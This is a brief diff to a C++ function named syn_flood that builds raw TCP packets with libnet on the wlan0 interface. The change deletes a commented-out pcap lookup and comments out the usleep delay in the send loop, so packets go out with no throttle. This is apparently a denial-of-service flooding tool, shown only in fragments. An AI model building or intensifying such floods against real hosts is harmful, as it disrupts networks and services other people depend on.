@@ -25,15 +25,6 @@ int syn_flood() {
   int packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;
   libnet_ptag_t packet;
 
-  /*
-  char errbuf_pcap[PCAP_ERRBUF_SIZE];
-  char *device = pcap_lookupdev(errbuf_pcap);
-  if (device == nullptr) {
-    std::cerr << "[!!] pcap_lookupdev: " << errbuf_pcap << std::endl;
-    return 1;
-  }
-  */
-
   char errbuf_libnet[LIBNET_ERRBUF_SIZE];
   libnet_t *l = libnet_init(LIBNET_RAW4, "wlan0", errbuf_libnet);
   if (l == nullptr) {
@@ -89,7 +80,7 @@ int syn_flood() {
       std::cerr << "Write error: " << libnet_geterror(l) << std::endl;
     }
 
-    usleep(5000);
+    // usleep(5000);
   }
   libnet_destroy(l);
   return 0;
